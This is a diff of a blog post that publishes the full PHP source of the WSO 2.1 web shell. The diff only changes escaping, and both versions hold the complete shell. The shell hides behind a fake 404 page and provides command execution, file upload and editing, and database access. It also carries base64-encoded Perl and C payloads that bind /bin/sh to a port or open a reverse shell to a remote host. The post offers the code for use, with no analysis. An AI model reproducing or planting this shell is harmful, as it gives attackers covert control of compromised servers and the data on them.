@@ -15,7 +15,7 @@ WSO 2.1 Web Shell by devilscafe.in
 
 ### WSO 2.1 Web Shell Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php 
+{% highlight php %}<?php 
 /* WSO 2.1 (Web Shell by devilscafe.in) */ 
 $auth_pass = "15de21c670ae7c3f6f3f1f37029303c9"; 
 $color = "#00ff00"; 
@@ -40,11 +40,11 @@ if( get_magic_quotes_gpc() ) {
     $_POST = stripslashes_array($_POST); 
 } 
 function printLogin() { 
-    ?&gt; 
+    ?> 
 &lt;h1&gt;Not Found&lt;/h1&gt; 
 &lt;p&gt;The requested URL was not found on this server.&lt;/p&gt; 
 &lt;hr&gt; 
-&lt;address&gt;Apache Server at &lt;?=$_SERVER['HTTP_HOST']?&gt; Port 80&lt;/address&gt; 
+&lt;address&gt;Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80&lt;/address&gt; 
     &lt;style&gt; 
         input { margin:0;background-color:#fff;border:1px solid #fff; } 
     &lt;/style&gt; 
@@ -52,7 +52,7 @@ function printLogin() {
     &lt;form method=post&gt; 
     &lt;input type=password name=pass&gt; 
     &lt;/form&gt;&lt;/center&gt; 
-    &lt;?php 
+    <?php 
     exit; 
 } 
 if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
@@ -145,20 +145,20 @@ function printHeader() {
     if(empty($_POST['charset'])) 
         $_POST['charset'] = "UTF-8"; 
     global $color; 
-    ?&gt; 
-&lt;html&gt;&lt;head&gt;&lt;meta http-equiv='Content-Type' content='text/html; charset=&lt;?=$_POST['charset']?&gt;'&gt;&lt;title&gt;&lt;?=$_SERVER['HTTP_HOST']?&gt;- 404 Not Found Shell V.&lt;?=VERSION?&gt;&lt;/title&gt; 
+    ?> 
+&lt;html&gt;&lt;head&gt;&lt;meta http-equiv='Content-Type' content='text/html; charset=<?=$_POST['charset']?>'&gt;&lt;title&gt;<?=$_SERVER['HTTP_HOST']?>- 404 Not Found Shell V.<?=VERSION?>&lt;/title&gt; 
 &lt;style&gt; 
     body {background-color:#000;color:#fff;} 
     body,td,th    { font: 9pt Lucida,Verdana;margin:0;vertical-align:top; } 
-    span,h1,a    { color:&lt;?=$color?&gt; !important; } 
+    span,h1,a    { color:<?=$color?> !important; } 
     span        { font-weight: bolder; } 
-    h1            { border:1px solid &lt;?=$color?&gt;;padding: 2px 5px;font: 14pt Verdana;margin:0px; } 
+    h1            { border:1px solid <?=$color?>;padding: 2px 5px;font: 14pt Verdana;margin:0px; } 
     div.content    { padding: 5px;margin-left:5px;} 
     a            { text-decoration:none; } 
     a:hover        { background:#ff0000; } 
     .ml1        { border:1px solid #444;padding:5px;margin:0;overflow: auto; } 
     .bigarea    { width:100%;height:250px; } 
-    input, textarea, select    { margin:0;color:#00ff00;background-color:#000;border:1px solid &lt;?=$color?&gt;; font: 9pt Monospace,"Courier New"; } 
+    input, textarea, select    { margin:0;color:#00ff00;background-color:#000;border:1px solid <?=$color?>; font: 9pt Monospace,"Courier New"; } 
     form        { margin:0px; } 
     #toolsTbl    { text-align:center; } 
     .toolsInp    { width: 80%; } 
@@ -186,7 +186,7 @@ function printHeader() {
         var params = "ajax=true"; 
         for(i=0;i&lt;document.mf.elements.length;i++) 
             params += "&"+document.mf.elements[i].name+"="+encodeURIComponent(document.mf.elements[i].value); 
-        sr('&lt;?=$_SERVER['REQUEST_URI'];?&gt;', params); 
+        sr('<?=$_SERVER['REQUEST_URI'];?>', params); 
     } 
     function sr(url, params) {     
         if (window.XMLHttpRequest) { 
@@ -219,14 +219,14 @@ function printHeader() {
 &lt;/script&gt; 
 &lt;head&gt;&lt;body&gt;&lt;div style="position:absolute;width:100%;top:0;left:0;"&gt; 
 &lt;form method=post name=mf style='display:none;'&gt; 
-&lt;input type=hidden name=a value='&lt;?=isset($_POST['a'])?$_POST['a']:''?&gt;'&gt; 
-&lt;input type=hidden name=c value='&lt;?=htmlspecialchars($GLOBALS['cwd'])?&gt;'&gt; 
-&lt;input type=hidden name=p1 value='&lt;?=isset($_POST['p1'])?htmlspecialchars($_POST['p1']):''?&gt;'&gt; 
-&lt;input type=hidden name=p2 value='&lt;?=isset($_POST['p2'])?htmlspecialchars($_POST['p2']):''?&gt;'&gt; 
-&lt;input type=hidden name=p3 value='&lt;?=isset($_POST['p3'])?htmlspecialchars($_POST['p3']):''?&gt;'&gt; 
-&lt;input type=hidden name=charset value='&lt;?=isset($_POST['charset'])?$_POST['charset']:''?&gt;'&gt; 
+&lt;input type=hidden name=a value='<?=isset($_POST['a'])?$_POST['a']:''?>'&gt; 
+&lt;input type=hidden name=c value='<?=htmlspecialchars($GLOBALS['cwd'])?>'&gt; 
+&lt;input type=hidden name=p1 value='<?=isset($_POST['p1'])?htmlspecialchars($_POST['p1']):''?>'&gt; 
+&lt;input type=hidden name=p2 value='<?=isset($_POST['p2'])?htmlspecialchars($_POST['p2']):''?>'&gt; 
+&lt;input type=hidden name=p3 value='<?=isset($_POST['p3'])?htmlspecialchars($_POST['p3']):''?>'&gt; 
+&lt;input type=hidden name=charset value='<?=isset($_POST['charset'])?$_POST['charset']:''?>'&gt; 
 &lt;/form&gt; 
-&lt;?php 
+<?php 
     $freeSpace = @diskfreespace($GLOBALS['cwd']); 
     $totalSpace = @disk_total_space($GLOBALS['cwd']); 
     $totalSpace = $totalSpace?$totalSpace:1; 
@@ -277,38 +277,38 @@ function printHeader() {
             $drives .= '&lt;a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')"&gt;[ '.$drive.' ]&lt;/a&gt; '; 
     } 
     echo '&lt;table class=info cellpadding=3 cellspacing=0 width=100%&gt;&lt;tr&gt;&lt;td width=1&gt;&lt;span&gt;Uname&lt;br&gt;User&lt;br&gt;Php&lt;br&gt;Hdd&lt;br&gt;Cwd'.($GLOBALS['os'] == 'win'?'&lt;br&gt;Drives':'').'&lt;/span&gt;&lt;/td&gt;'. 
-         '&lt;td&gt;:&lt;nobr&gt;'.substr(@php_uname(), 0, 120).'  &lt;a href="http://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank"&gt;[Google]&lt;/a&gt; &lt;a href="'.$millink.'" target=_blank&gt;[milw0rm]&lt;/a&gt;&lt;/nobr&gt;&lt;br&gt;:'.$uid.' ( '.$user.' ) &lt;span&gt;Group:&lt;/span&gt; '.$gid.' ( '.$group.' )&lt;br&gt;:'.@phpversion().' &lt;span&gt;Safe mode:&lt;/span&gt; '.($GLOBALS['safe_mode']?'&lt;font color=red&gt;ON&lt;/font&gt;':'&lt;font color=&lt;?=$color?&gt;&lt;b&gt;OFF&lt;/b&gt;&lt;/font&gt;').' &lt;a href=# onclick="g(\'Php\',null,null,\'info\')"&gt;[ phpinfo ]&lt;/a&gt; &lt;span&gt;Datetime:&lt;/span&gt; '.date('Y-m-d H:i:s').'&lt;br&gt;:'.viewSize($totalSpace).' &lt;span&gt;Free:&lt;/span&gt; '.viewSize($freeSpace).' ('.(int)($freeSpace/$totalSpace*100).'%)&lt;br&gt;:'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' &lt;a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')"&gt;[ home ]&lt;/a&gt;&lt;br&gt;:'.$drives.'&lt;/td&gt;'. 
+         '&lt;td&gt;:&lt;nobr&gt;'.substr(@php_uname(), 0, 120).'  &lt;a href="http://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank"&gt;[Google]&lt;/a&gt; &lt;a href="'.$millink.'" target=_blank&gt;[milw0rm]&lt;/a&gt;&lt;/nobr&gt;&lt;br&gt;:'.$uid.' ( '.$user.' ) &lt;span&gt;Group:&lt;/span&gt; '.$gid.' ( '.$group.' )&lt;br&gt;:'.@phpversion().' &lt;span&gt;Safe mode:&lt;/span&gt; '.($GLOBALS['safe_mode']?'&lt;font color=red&gt;ON&lt;/font&gt;':'&lt;font color=<?=$color?>&lt;b&gt;OFF&lt;/b&gt;&lt;/font&gt;').' &lt;a href=# onclick="g(\'Php\',null,null,\'info\')"&gt;[ phpinfo ]&lt;/a&gt; &lt;span&gt;Datetime:&lt;/span&gt; '.date('Y-m-d H:i:s').'&lt;br&gt;:'.viewSize($totalSpace).' &lt;span&gt;Free:&lt;/span&gt; '.viewSize($freeSpace).' ('.(int)($freeSpace/$totalSpace*100).'%)&lt;br&gt;:'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' &lt;a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')"&gt;[ home ]&lt;/a&gt;&lt;br&gt;:'.$drives.'&lt;/td&gt;'. 
          '&lt;td width=1 align=right&gt;&lt;nobr&gt;&lt;select onchange="g(null,null,null,null,null,this.value)"&gt;&lt;optgroup label="Page charset"&gt;'.$opt_charsets.'&lt;/optgroup&gt;&lt;/select&gt;&lt;br&gt;&lt;span&gt;Server IP:&lt;/span&gt;&lt;br&gt;'.gethostbyname($_SERVER["HTTP_HOST"]).'&lt;br&gt;&lt;span&gt;Client IP:&lt;/span&gt;&lt;br&gt;'.$_SERVER['REMOTE_ADDR'].'&lt;/nobr&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;'. 
          '&lt;table cellpadding=3 cellspacing=0 width=100%&gt;&lt;tr&gt;'.$menu.'&lt;/tr&gt;&lt;/table&gt;&lt;div style="margin:5"&gt;'; 
 } 
 
 function printFooter() { 
     $is_writable = is_writable($GLOBALS['cwd'])?"&lt;font color=green&gt;[ Writeable ]&lt;/font&gt;":"&lt;font color=red&gt;[ Not writable ]&lt;/font&gt;"; 
-?&gt; 
+?> 
 &lt;/div&gt; 
 &lt;table class=info id=toolsTbl cellpadding=0 cellspacing=0 width=100%"&gt; 
     &lt;tr&gt; 
-        &lt;td&gt;&lt;form onsubmit="g(null,this.c.value);return false;"&gt;&lt;span&gt;Change dir:&lt;/span&gt;&lt;br&gt;&lt;input class="toolsInp" type=text name=c value="&lt;?=htmlspecialchars($GLOBALS['cwd']);?&gt;"&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;/td&gt; 
+        &lt;td&gt;&lt;form onsubmit="g(null,this.c.value);return false;"&gt;&lt;span&gt;Change dir:&lt;/span&gt;&lt;br&gt;&lt;input class="toolsInp" type=text name=c value="<?=htmlspecialchars($GLOBALS['cwd']);?>"&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;/td&gt; 
         &lt;td&gt;&lt;form onsubmit="g('FilesTools',null,this.f.value);return false;"&gt;&lt;span&gt;Read file:&lt;/span&gt;&lt;br&gt;&lt;input class="toolsInp" type=text name=f&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;/td&gt; 
     &lt;/tr&gt; 
     &lt;tr&gt; 
-        &lt;td&gt;&lt;form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"&gt;&lt;span&gt;Make dir:&lt;/span&gt;&lt;br&gt;&lt;input class="toolsInp" type=text name=d&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;?=$is_writable?&gt;&lt;/td&gt; 
-        &lt;td&gt;&lt;form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"&gt;&lt;span&gt;Make file:&lt;/span&gt;&lt;br&gt;&lt;input class="toolsInp" type=text name=f&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;?=$is_writable?&gt;&lt;/td&gt; 
+        &lt;td&gt;&lt;form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"&gt;&lt;span&gt;Make dir:&lt;/span&gt;&lt;br&gt;&lt;input class="toolsInp" type=text name=d&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;<?=$is_writable?>&lt;/td&gt; 
+        &lt;td&gt;&lt;form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"&gt;&lt;span&gt;Make file:&lt;/span&gt;&lt;br&gt;&lt;input class="toolsInp" type=text name=f&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;<?=$is_writable?>&lt;/td&gt; 
     &lt;/tr&gt; 
     &lt;tr&gt; 
         &lt;td&gt;&lt;form onsubmit="g('Console',null,this.c.value);return false;"&gt;&lt;span&gt;Execute:&lt;/span&gt;&lt;br&gt;&lt;input class="toolsInp" type=text name=c value=""&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;/td&gt; 
         &lt;td&gt;&lt;form method='post' ENCTYPE='multipart/form-data'&gt; 
         &lt;input type=hidden name=a value='FilesMAn'&gt; 
-        &lt;input type=hidden name=c value='&lt;?=htmlspecialchars($GLOBALS['cwd'])?&gt;'&gt; 
+        &lt;input type=hidden name=c value='<?=htmlspecialchars($GLOBALS['cwd'])?>'&gt; 
         &lt;input type=hidden name=p1 value='uploadFile'&gt; 
-        &lt;input type=hidden name=charset value='&lt;?=isset($_POST['charset'])?$_POST['charset']:''?&gt;'&gt; 
-        &lt;span&gt;Upload file:&lt;/span&gt;&lt;br&gt;&lt;input class="toolsInp" type=file name=f&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;?=$is_writable?&gt;&lt;/td&gt; 
+        &lt;input type=hidden name=charset value='<?=isset($_POST['charset'])?$_POST['charset']:''?>'&gt; 
+        &lt;span&gt;Upload file:&lt;/span&gt;&lt;br&gt;&lt;input class="toolsInp" type=file name=f&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;<?=$is_writable?>&lt;/td&gt; 
     &lt;/tr&gt; 
 
 &lt;/table&gt; 
 &lt;/div&gt; 
 &lt;/body&gt;&lt;/html&gt; 
-&lt;?php 
+<?php 
 } 
 if ( !function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false) ) { function posix_getpwuid($p) { return false; } }
 if ( !function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false) ) { function posix_getgrgid($p) { return false; } }
@@ -587,7 +587,7 @@ function actionFilesMan() {
         if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match)) 
             $sort = array($match[1], (int)$match[2]); 
     } 
-?&gt; 
+?> 
 &lt;script&gt; 
     function sa() { 
         for(i=0;i&lt;document.files.elements.length;i++) 
@@ -597,7 +597,7 @@ function actionFilesMan() {
 &lt;/script&gt; 
 &lt;table width='100%' class='main' cellspacing='0' cellpadding='2'&gt; 
 &lt;form name=files method=post&gt; 
-&lt;?php 
+<?php 
     echo "&lt;tr&gt;&lt;th width='13px'&gt;&lt;input type=checkbox onclick='sa()' class=chkbx&gt;&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'&gt;Modify&lt;/a&gt;&lt;/th&gt;&lt;th&gt;Owner/Group&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'&gt;Permissions&lt;/a&gt;&lt;/th&gt;&lt;th&gt;Actions&lt;/th&gt;&lt;/tr&gt;"; 
     $dirs = $files = $links = array(); 
     $n = count($dirContent); 
@@ -636,14 +636,14 @@ function actionFilesMan() {
             .'&lt;/td&gt;&lt;td&gt;&lt;a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')"&gt;R&lt;/a&gt; &lt;a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')"&gt;T&lt;/a&gt;'.(($f['type']=='file')?' &lt;a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')"&gt;E&lt;/a&gt; &lt;a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')"&gt;D&lt;/a&gt;':'').'&lt;/td&gt;&lt;/tr&gt;'; 
         $l = $l?0:1; 
     } 
-    ?&gt; 
+    ?> 
     &lt;tr&gt;&lt;td colspan=7&gt; 
     &lt;input type=hidden name=a value='FilesMan'&gt; 
-    &lt;input type=hidden name=c value='&lt;?=htmlspecialchars($GLOBALS['cwd'])?&gt;'&gt; 
-    &lt;input type=hidden name=charset value='&lt;?=isset($_POST['charset'])?$_POST['charset']:''?&gt;'&gt; 
-    &lt;select name='p1'&gt;&lt;option value='copy'&gt;Copy&lt;/option&gt;&lt;option value='move'&gt;Move&lt;/option&gt;&lt;option value='delete'&gt;Delete&lt;/option&gt;&lt;?php if(!empty($_SESSION['act'])&&@count($_SESSION['f'])){?&gt;&lt;option value='paste'&gt;Paste&lt;/option&gt;&lt;?php }?&gt;&lt;/select&gt;&nbsp;&lt;input type="submit" value="&gt;&gt;"&gt;&lt;/td&gt;&lt;/tr&gt; 
+    &lt;input type=hidden name=c value='<?=htmlspecialchars($GLOBALS['cwd'])?>'&gt; 
+    &lt;input type=hidden name=charset value='<?=isset($_POST['charset'])?$_POST['charset']:''?>'&gt; 
+    &lt;select name='p1'&gt;&lt;option value='copy'&gt;Copy&lt;/option&gt;&lt;option value='move'&gt;Move&lt;/option&gt;&lt;option value='delete'&gt;Delete&lt;/option&gt;<?php if(!empty($_SESSION['act'])&&@count($_SESSION['f'])){?>&lt;option value='paste'&gt;Paste&lt;/option&gt;<?php }?>&lt;/select&gt;&nbsp;&lt;input type="submit" value="&gt;&gt;"&gt;&lt;/td&gt;&lt;/tr&gt; 
     &lt;/form&gt;&lt;/table&gt;&lt;/div&gt; 
-    &lt;?php 
+    <?php 
     printFooter(); 
 } 
 
@@ -698,7 +698,7 @@ function actionStringTools() {
         echo htmlspecialchars($_POST['p1']($_POST['p2'])); 
     } 
     echo"&lt;/pre&gt;&lt;/div&gt;"; 
-    ?&gt; 
+    ?> 
     &lt;br&gt;&lt;h1&gt;Search for hash:&lt;/h1&gt;&lt;div class=content&gt; 
         &lt;form method='post' target='_blank' name="hf"&gt; 
             &lt;input type="text" name="hash" style="width:200px;"&gt;&lt;br&gt; 
@@ -709,7 +709,7 @@ function actionStringTools() {
             &lt;input type="button" value="md5decrypter.com" onclick="document.hf.action='http://www.md5decrypter.com/';document.hf.submit()"&gt;&lt;br&gt; 
         &lt;/form&gt; 
     &lt;/div&gt; 
-    &lt;?php 
+    <?php 
     printFooter(); 
 } 
 
@@ -938,7 +938,7 @@ function actionConsole() {
         exit; 
     } 
     printHeader(); 
-?&gt; 
+?> 
 &lt;script&gt; 
 if(window.Event) window.captureEvents(Event.KEYDOWN); 
 var cmds = new Array(""); 
@@ -966,7 +966,7 @@ function add(cmd) {
     cur = cmds.length-1; 
 } 
 &lt;/script&gt; 
-&lt;?php 
+<?php 
     echo '&lt;h1&gt;Console&lt;/h1&gt;&lt;div class=content&gt;&lt;form name=cf onsubmit="if(document.cf.cmd.value==\'clear\'){document.cf.output.value=\'\';document.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value);}else{g(null,null,this.cmd.value);} return false;"&gt;&lt;select name=alias&gt;'; 
     foreach($GLOBALS['aliases'] as $n =&gt; $v) { 
         if($v == '') { 
@@ -1229,7 +1229,7 @@ function actionSql() {
         exit; 
     } 
     printHeader(); 
-    ?&gt; 
+    ?> 
     &lt;h1&gt;Sql browser&lt;/h1&gt;&lt;div class=content&gt; 
     &lt;form name="sf" method="post"&gt; 
         &lt;table cellpadding="2" cellspacing="0"&gt; 
@@ -1245,18 +1245,18 @@ function actionSql() {
                 &lt;input type=hidden name=a value=Sql&gt; 
                 &lt;input type=hidden name=p1 value='query'&gt; 
                 &lt;input type=hidden name=p2&gt; 
-                &lt;input type=hidden name=c value='&lt;?=htmlspecialchars($GLOBALS['cwd']);?&gt;'&gt; 
-                &lt;input type=hidden name=charset value='&lt;?=isset($_POST['charset'])?$_POST['charset']:''?&gt;'&gt; 
+                &lt;input type=hidden name=c value='<?=htmlspecialchars($GLOBALS['cwd']);?>'&gt; 
+                &lt;input type=hidden name=charset value='<?=isset($_POST['charset'])?$_POST['charset']:''?>'&gt; 
                 &lt;td&gt; 
                     &lt;select name='type'&gt; 
-                        &lt;option value="mysql" &lt;?php if(@$_POST['type']=='mysql')echo 'selected';?&gt;&gt;MySql&lt;/option&gt; 
-                        &lt;option value="pgsql" &lt;?php if(@$_POST['type']=='pgsql')echo 'selected';?&gt;&gt;PostgreSql&lt;/option&gt; 
+                        &lt;option value="mysql" <?php if(@$_POST['type']=='mysql')echo 'selected';?>&gt;MySql&lt;/option&gt; 
+                        &lt;option value="pgsql" <?php if(@$_POST['type']=='pgsql')echo 'selected';?>&gt;PostgreSql&lt;/option&gt; 
                     &lt;/select&gt;&lt;/td&gt; 
-                &lt;td&gt;&lt;input type=text name=sql_host value='&lt;?=(empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host']));?&gt;'&gt;&lt;/td&gt; 
-                &lt;td&gt;&lt;input type=text name=sql_login value='&lt;?=(empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login']));?&gt;'&gt;&lt;/td&gt; 
-                &lt;td&gt;&lt;input type=text name=sql_pass value='&lt;?=(empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass']));?&gt;'&gt;&lt;/td&gt; 
+                &lt;td&gt;&lt;input type=text name=sql_host value='<?=(empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host']));?>'&gt;&lt;/td&gt; 
+                &lt;td&gt;&lt;input type=text name=sql_login value='<?=(empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login']));?>'&gt;&lt;/td&gt; 
+                &lt;td&gt;&lt;input type=text name=sql_pass value='<?=(empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass']));?>'&gt;&lt;/td&gt; 
                 &lt;td&gt; 
-    &lt;?php 
+    <?php 
     $tmp = "&lt;input type=text name=sql_base value=''&gt;"; 
     if(isset($_POST['sql_host'])){ 
         if($db-&gt;connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) { 
@@ -1278,7 +1278,7 @@ function actionSql() {
         else echo $tmp; 
     }else 
         echo $tmp; 
-    ?&gt;&lt;/td&gt; 
+    ?>&lt;/td&gt; 
                 &lt;td&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/td&gt; 
             &lt;/tr&gt; 
         &lt;/table&gt; 
@@ -1294,7 +1294,7 @@ function actionSql() {
                     document.sf.elements['tbl[]'][i].checked = !document.sf.elements['tbl[]'][i].checked; 
             } 
         &lt;/script&gt; 
-    &lt;?php 
+    <?php 
     if(isset($db) && $db-&gt;link){ 
         echo "&lt;br/&gt;&lt;table width=100% cellpadding=2 cellspacing=0&gt;"; 
             if(!empty($_POST['sql_base'])){ 
@@ -1375,7 +1375,7 @@ function actionNetwork() {
     $back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7"; 
     $bind_port_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikgew0KICAgIGludCBzLGMsaTsNCiAgICBjaGFyIHBbMzBdOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByOw0KICAgIGRhZW1vbigxLDApOw0KICAgIHMgPSBzb2NrZXQoQUZfSU5FVCxTT0NLX1NUUkVBTSwwKTsNCiAgICBpZighcykgcmV0dXJuIC0xOw0KICAgIHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgci5zaW5fcG9ydCA9IGh0b25zKGF0b2koYXJndlsxXSkpOw0KICAgIHIuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7DQogICAgYmluZChzLCAoc3RydWN0IHNvY2thZGRyICopJnIsIDB4MTApOw0KICAgIGxpc3RlbihzLCA1KTsNCiAgICB3aGlsZSgxKSB7DQogICAgICAgIGM9YWNjZXB0KHMsMCwwKTsNCiAgICAgICAgZHVwMihjLDApOw0KICAgICAgICBkdXAyKGMsMSk7DQogICAgICAgIGR1cDIoYywyKTsNCiAgICAgICAgd3JpdGUoYywiUGFzc3dvcmQ6Iiw5KTsNCiAgICAgICAgcmVhZChjLHAsc2l6ZW9mKHApKTsNCiAgICAgICAgZm9yKGk9MDtpPHN0cmxlbihwKTtpKyspDQogICAgICAgICAgICBpZiggKHBbaV0gPT0gJ1xuJykgfHwgKHBbaV0gPT0gJ1xyJykgKQ0KICAgICAgICAgICAgICAgIHBbaV0gPSAnXDAnOw0KICAgICAgICBpZiAoc3RyY21wKGFyZ3ZbMl0scCkgPT0gMCkNCiAgICAgICAgICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgICAgICBjbG9zZShjKTsNCiAgICB9DQp9"; 
     $bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0="; 
-    ?&gt; 
+    ?> 
     &lt;h1&gt;Network tools&lt;/h1&gt;&lt;div class=content&gt; 
     &lt;form name='nfp' onSubmit="g(null,null,this.using.value,this.port.value,this.pass.value);return false;"&gt; 
     &lt;span&gt;Bind port to /bin/sh&lt;/span&gt;&lt;br/&gt; 
@@ -1383,9 +1383,9 @@ function actionNetwork() {
     &lt;/form&gt; 
     &lt;form name='nfp' onSubmit="g(null,null,this.using.value,this.server.value,this.port.value);return false;"&gt; 
     &lt;span&gt;Back-connect to&lt;/span&gt;&lt;br/&gt; 
-    Server: &lt;input type='text' name='server' value='&lt;?=$_SERVER['REMOTE_ADDR']?&gt;'&gt; Port: &lt;input type='text' name='port' value='31337'&gt; Using: &lt;select name="using"&gt;&lt;option value='bcc'&gt;C&lt;/option&gt;&lt;option value='bcp'&gt;Perl&lt;/option&gt;&lt;/select&gt; &lt;input type=submit value="&gt;&gt;"&gt; 
+    Server: &lt;input type='text' name='server' value='<?=$_SERVER['REMOTE_ADDR']?>'&gt; Port: &lt;input type='text' name='port' value='31337'&gt; Using: &lt;select name="using"&gt;&lt;option value='bcc'&gt;C&lt;/option&gt;&lt;option value='bcp'&gt;Perl&lt;/option&gt;&lt;/select&gt; &lt;input type=submit value="&gt;&gt;"&gt; 
     &lt;/form&gt;&lt;br&gt; 
-    &lt;?php 
+    <?php 
     if(isset($_POST['p1'])) { 
         function cf($f,$t) { 
             $w=@fopen($f,"w") or @function_exists('file_put_contents'); 
@@ -1429,14 +1429,14 @@ if( empty($_POST['a']) )
         $_POST['a'] = 'SecInfo'; 
 if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) ) 
     call_user_func('action' . $_POST['a']); 
-?&gt; 
+?> 
